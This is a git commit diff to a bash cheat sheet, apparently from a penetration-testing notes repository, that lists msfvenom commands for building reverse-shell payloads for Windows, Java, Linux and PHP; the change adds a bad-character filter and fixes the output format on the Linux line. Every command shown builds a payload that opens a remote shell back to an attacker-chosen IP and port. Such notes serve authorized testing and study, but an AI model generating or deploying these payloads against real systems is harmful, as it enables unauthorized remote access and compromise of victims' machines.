738494bb630ce1bc41b3ec323aad86cd00057df1
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-10-22 08:43:35 -0300

    Update msfvenom_payload.sh

--- Code/Bash/msfvenom_payload.sh
+++ Code/Bash/msfvenom_payload.sh
@@ -4,7 +4,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[IP] lport=[PORT] -f .exe 
 # Java
 msfvenom -p java/jsp_shell_reverse_tcp lhost=[IP] lport=[PORT] -f .war -o [output.war]
 # Linux
-msfvenom --smallest -p linux/x86/shell/reverse_tcp lhost=[IP] lport=[PORT] -f .elf -o [output.elf] # [WIP]
+msfvenom --smallest -b '\x00\x0a\x0d\x20' -p linux/x86/shell/reverse_tcp lhost=[IP] lport=[PORT] -f elf -o [output.elf] # [WIP]
 # PHP
 msfvenom -p php/meterpreter/reverse_tcp lhost=[IP] lport=[PORT] -f raw > [output.php]
 # Encoded:
